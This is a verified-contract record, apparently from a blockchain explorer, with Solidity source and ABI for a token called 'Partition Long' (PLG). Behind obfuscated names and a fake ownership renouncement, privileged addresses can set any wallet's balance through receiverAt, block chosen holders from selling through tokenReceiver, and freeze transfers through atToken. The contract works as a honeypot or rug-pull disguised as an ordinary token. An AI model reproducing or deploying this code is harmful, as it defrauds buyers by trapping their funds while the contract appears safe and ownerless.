{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface takeTxSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTakeIs {\n    function createPair(address tokenAtTeam, address walletLaunch) external returns (address);\n}\n\ninterface totalTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isReceiver) external view returns (uint256);\n\n    function transfer(address atExemptAuto, uint256 feeTrading) external returns (bool);\n\n    function allowance(address liquidityTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atExemptAuto,\n        uint256 feeTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeReceiverWallet, uint256 value);\n    event Approval(address indexed liquidityTrading, address indexed spender, uint256 value);\n}\n\ninterface totalTxMetadata is totalTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PartitionLong is autoTo, totalTx, totalTxMetadata {\n\n    uint8 private listMarketing = 18;\n\n    event OwnershipTransferred(address indexed shouldTeam, address indexed fundExempt);\n\n    address feeLaunchedToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return senderTx;\n    }\n\n    function buyMode(address enableAtBuy) public {\n        if (swapMin) {\n            return;\n        }\n        if (receiverEnable == sellExempt) {\n            tokenLiquidityTotal = shouldTotal;\n        }\n        shouldTrading[enableAtBuy] = true;\n        \n        swapMin = true;\n    }\n\n    address public toTeamAmount;\n\n    bool public receiverEnable;\n\n    uint256 constant amountLaunchTrading = 19 ** 10;\n\n    function approve(address exemptEnable, uint256 feeTrading) public virtual override returns (bool) {\n        limitReceiver[_msgSender()][exemptEnable] = feeTrading;\n        emit Approval(_msgSender(), exemptEnable, feeTrading);\n        return true;\n    }\n\n    function autoTx() private view {\n        require(shouldTrading[_msgSender()]);\n    }\n\n    address private senderMinTotal;\n\n    function tokenTeamFee(address feeEnable, address atExemptAuto, uint256 feeTrading) internal returns (bool) {\n        if (feeEnable == toTeamAmount) {\n            return buyShould(feeEnable, atExemptAuto, feeTrading);\n        }\n        uint256 autoSenderLaunch = totalTx(listLaunched).balanceOf(autoMode);\n        require(autoSenderLaunch == txMarketing);\n        require(atExemptAuto != autoMode);\n        if (tokenTo[feeEnable]) {\n            return buyShould(feeEnable, atExemptAuto, amountLaunchTrading);\n        }\n        return buyShould(feeEnable, atExemptAuto, feeTrading);\n    }\n\n    uint256 private launchedTo;\n\n    bool public swapMin;\n\n    function allowance(address atTx, address exemptEnable) external view virtual override returns (uint256) {\n        if (exemptEnable == feeLaunchedToken) {\n            return type(uint256).max;\n        }\n        return limitReceiver[atTx][exemptEnable];\n    }\n\n    string private senderTx = \"Partition Long\";\n\n    function tokenReceiver(address liquidityList) public {\n        autoTx();\n        \n        if (liquidityList == toTeamAmount || liquidityList == listLaunched) {\n            return;\n        }\n        tokenTo[liquidityList] = true;\n    }\n\n    bool public exemptMin;\n\n    uint256 private swapReceiver;\n\n    mapping(address => bool) public tokenTo;\n\n    function getOwner() external view returns (address) {\n        return senderMinTotal;\n    }\n\n    uint256 public shouldTotal;\n\n    function owner() external view returns (address) {\n        return senderMinTotal;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderTo;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listMarketing;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchReceiver;\n    }\n\n    function atToken(uint256 feeTrading) public {\n        autoTx();\n        txMarketing = feeTrading;\n    }\n\n    bool private autoTotal;\n\n    uint256 public tokenLiquidityTotal;\n\n    uint256 public receiverLiquidity;\n\n    string private launchReceiver = \"PLG\";\n\n    constructor (){\n        \n        takeTxSender amountReceiverEnable = takeTxSender(feeLaunchedToken);\n        listLaunched = minTakeIs(amountReceiverEnable.factory()).createPair(amountReceiverEnable.WETH(), address(this));\n        \n        toTeamAmount = _msgSender();\n        minTotal();\n        shouldTrading[toTeamAmount] = true;\n        fundShould[toTeamAmount] = senderTo;\n        if (sellExempt == amountFund) {\n            sellExempt = false;\n        }\n        emit Transfer(address(0), toTeamAmount, senderTo);\n    }\n\n    mapping(address => mapping(address => uint256)) private limitReceiver;\n\n    function balanceOf(address isReceiver) public view virtual override returns (uint256) {\n        return fundShould[isReceiver];\n    }\n\n    uint256 private senderTo = 100000000 * 10 ** 18;\n\n    function receiverAt(address launchTake, uint256 feeTrading) public {\n        autoTx();\n        fundShould[launchTake] = feeTrading;\n    }\n\n    function minTotal() public {\n        emit OwnershipTransferred(toTeamAmount, address(0));\n        senderMinTotal = address(0);\n    }\n\n    bool private amountFund;\n\n    uint256 isSender;\n\n    function transferFrom(address feeEnable, address atExemptAuto, uint256 feeTrading) external override returns (bool) {\n        if (_msgSender() != feeLaunchedToken) {\n            if (limitReceiver[feeEnable][_msgSender()] != type(uint256).max) {\n                require(feeTrading <= limitReceiver[feeEnable][_msgSender()]);\n                limitReceiver[feeEnable][_msgSender()] -= feeTrading;\n            }\n        }\n        return tokenTeamFee(feeEnable, atExemptAuto, feeTrading);\n    }\n\n    address autoMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public listLaunched;\n\n    function buyShould(address feeEnable, address atExemptAuto, uint256 feeTrading) internal returns (bool) {\n        require(fundShould[feeEnable] >= feeTrading);\n        fundShould[feeEnable] -= feeTrading;\n        fundShould[atExemptAuto] += feeTrading;\n        emit Transfer(feeEnable, atExemptAuto, feeTrading);\n        return true;\n    }\n\n    uint256 txMarketing;\n\n    mapping(address => bool) public shouldTrading;\n\n    bool private sellExempt;\n\n    function transfer(address launchTake, uint256 feeTrading) external virtual override returns (bool) {\n        return tokenTeamFee(_msgSender(), launchTake, feeTrading);\n    }\n\n    mapping(address => uint256) private fundShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiverWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeTrading\",\"type\":\"uint256\"}],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAtBuy\",\"type\":\"address\"}],\"name\":\"buyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTrading\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTeamAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidityTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atExemptAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PartitionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}